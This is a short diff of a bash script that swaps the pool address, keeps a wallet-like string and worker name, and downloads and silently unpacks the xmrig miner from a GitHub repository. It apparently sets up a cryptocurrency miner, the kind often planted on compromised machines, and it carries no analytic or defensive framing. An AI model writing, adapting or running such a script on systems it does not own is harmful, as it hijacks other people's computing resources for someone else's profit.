@@ -1,5 +1,5 @@
 #!/bin/bash
-A=128.199.195.239:443
+A=139.162.30.175:443
 B=SaLvsB7hLCcUwHZ6WHaCLw9VrueHTQFktSDCUSe9X4QRbyb3WCLeyjZEKCuA7w1tU2PQjFuK5mjKCVTopSv9seHwWPuQ8TYUD6a
 C=SUKRO
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
